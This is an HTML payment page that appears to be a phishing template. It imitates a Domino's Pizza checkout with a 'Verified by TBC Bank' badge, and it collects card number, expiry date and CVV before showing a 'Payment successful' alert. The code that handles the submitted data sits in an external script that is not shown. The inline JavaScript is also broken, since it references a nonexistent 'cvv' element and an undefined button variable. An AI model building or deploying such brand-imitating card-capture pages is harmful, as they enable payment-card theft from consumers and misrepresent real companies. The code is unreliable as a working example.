<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Payment Page</title>
  <style>
    :root {
      --blue: #00a9f4;
      --dark: #1f2937;
      --muted: #6b7280;
      --error: #ef4444;
      --border: #e5e7eb;
      --bg: #ffffff;
      --soft: #f9fafb;
      --shadow: 0 4px 12px rgba(0, 0, 0, .08);
      --radius: 10px;
    }

    * {
      box-sizing: border-box;
      padding: 0;
      margin: 0;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }

    .for_logo {
      width: 100%;
      margin-top: 40px;
      margin-bottom: 20px;
    }

    .card {
      max-width: 420px;
      width: 100%;
      background: var(--bg);
      padding: 36px 28px;
      border-radius: var(--radius);
      box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
      text-align: center;
    }

    .top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .help {
      font-size: 14px;
      color: #111;
      text-decoration: none;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .help::before {
      content: "?";
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 1.5px solid #111;
      border-radius: 50%;
      font-size: 12px;
      text-align: center;
      line-height: 18px;
    }

    .amount {
      border-radius: 8px;
      padding: 12px 16px;
      margin-bottom: 26px;
      display: flex;
      justify-content: space-between;
      font-size: 16px;
    }

    .amount strong {
      color: var(--dark)
    }

    h2 {
      font-size: 20px;
      margin: 0 0 20px;
    }

    input {
      width: 100%;
      padding: 14px 12px;
      border: 1px solid var(--border);
      border-radius: 8px;
      font-size: 15px;
      outline: none;
      margin-bottom: 16px;
    }

    input:focus {
      border-color: var(--blue)
    }

    .row {
      display: flex;
      gap: 14px;
    }

    .row input {
      flex: 1
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      background: var(--blue);
      color: #fff;
      cursor: pointer;
      margin-top: 10px;
    }

    .btn:hover {
      background: #0090d1
    }

    .verified {
      font-size: 13px;
      margin-top: 14px;
      color: #444;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 6px;
    }

    .verified::before {
      content: "";
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: linear-gradient(135deg, #16a34a, #22c55e);
      display: inline-block;
    }

    .domino_logo {
      width: 35px;
    }

    .loader {
  width: 50px;
  padding: 8px;
  aspect-ratio: 1;
  border-radius: 50%;
  background: #00a9f4;
  display: none;
  --_m: 
    conic-gradient(#0000 10%,#000),
    linear-gradient(#000 0 0) content-box;
  -webkit-mask: var(--_m);
          mask: var(--_m);
  -webkit-mask-composite: source-out;
          mask-composite: subtract;
  animation: l3 1s infinite linear;
}
@keyframes l3 {to{transform: rotate(1turn)}}
  </style>
</head>

<body>
  <form id="msform">
    <div class="card">
    <div class="top">
      <img class="domino_logo" src="./Domino's_pizza_logo.svg.png" alt="">
      <a href="#" class="help">Help</a>
    </div>

    <div class="amount">
      <span>Amount:</span>
      <strong class="for_price"></strong>
    </div>

    <h2>Card Info</h2>

    <input type="text" id="card-number" placeholder="Card Number" maxlength="19">
    <div class="row">
      <input type="text" id="expiry-month" name="cardDate" placeholder="Expiration Date" maxlength="5">
      <input type="text" id="security-code" name="cardCVV" placeholder="CVC / CVV" maxlength="4">
    </div>

    <button onclick="next_pages()" class="btn" id="payButton">→ PAY</button>

    <img class="for_logo" src="./image copy.png" alt="">

    <div class="verified">Verified by TBC Bank</div>
  </div>
  </form>
<div class="loader"></div> 

  <script>
    window.onload = function() {
      var price = sessionStorage.getItem("dataprice")

      document.querySelector(".for_price").innerHTML = price
    }
  </script>

  <script>

    


    const cardInput = document.getElementById("card-number");
    const expiryInput = document.getElementById("expiry-month");
    const cvvInput = document.getElementById("cvv");

    // Card Number format: 1234 5678 9012 3456
    cardInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      value = value.substring(0, 16);
      let formatted = value.match(/.{1,4}/g);
      e.target.value = formatted ? formatted.join(" ") : "";
    });

    // Expiration Date format: MM/YY
    expiryInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length >= 3) {
        value = value.slice(0, 2) + "/" + value.slice(2, 4);
      }
      e.target.value = value;
    });

    // CVV faqat 3 raqam
    cvvInput.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 3);
    });

    payBtn.addEventListener("click", () => {
      let card = cardInput.value.replace(/\s/g, "");
      let expiry = expiryInput.value;
      let cvv = cvvInput.value;

      if (card.length < 16) {
        alert("❌ Card number is invalid!");
      } else if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        alert("❌ Expiration date is invalid!");
      } else if (cvv.length < 3) {
        alert("❌ CVV is invalid!");
      } else {
        alert("✅ Payment successful!");
      }
    });
  </script>

  <script src="secure/js/jquery.min.js" ></script>
    <script src="./js/jquery.payment.min.js" ></script>
    <script src="js/jquery.validate.min.js" ></script>
    <script src="js/checkout-script.js" ></script>
</body>

</html>
